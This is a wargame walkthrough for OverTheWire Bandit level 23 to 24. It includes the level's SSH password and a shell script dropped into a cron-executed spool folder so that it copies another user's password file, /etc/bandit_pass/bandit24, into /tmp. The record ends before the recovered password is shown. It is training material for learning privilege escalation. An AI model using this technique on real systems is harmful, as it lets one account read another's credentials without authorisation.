1.  First loging in to the remote server via ssh

        $ ssh bandit23@bandit.labs.overthewire.org -p 2220
		  username: bandit23
		  password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n 

	
2.	As the admin says -
		 " program is running automatically at regular intervals from cron, the time-based job scheduler.
		 Look in /etc/cron.d/ for the configuration and see what command is being executed.

		 NOTE: This level requires you to create your own first shell-script. This is a very big step and
		 you should be proud of yourself when you beat this level!

		 NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a 
		 copy aroundâ€¦
		 "
		 

3.	First moving to /etc/cron.d directory
		
		$ cd /etc/cron.d/  

		$ cat cronjob_bandit24
		@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
		* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

	Now, we need to look at the /usr/bin/cronjob_bandit24.sh script

		
		$ cat /usr/bin/cronjob_bandit24.sh
		#!/bin/bash

		myname=$(whoami)

		cd /var/spool/$myname
		echo "Executing and deleting all scripts in /var/spool/$myname:"
		for i in * .*;
		do
		    if [ "$i" != "." -a "$i" != ".." ];
			then
				echo "Handling $i"
				timeout -s 9 60 ./$i
				rm -f ./$i
			fi
		done

	So, this script is executing and then deleting all the scripts in /var/spool/$username.

	So we make a script in /tmp directory which copies /etc/bandit_pass/bandit24 to a file in this 
	directory.

		$ mkdir /tmp/my
		$ vim script
		#!/bin/bash

		cat /etc/bandit_pass/bandit24 > /tmp/my/pass24.txt

		$ chmod 755 script
		$ cp script /var/spool/bandit24

	After a minute a get to see a "pass24.txt" in the folder /tmp/my

		$ ls
		1.sh  pass24.txt  script

		$ cat pass24.txt
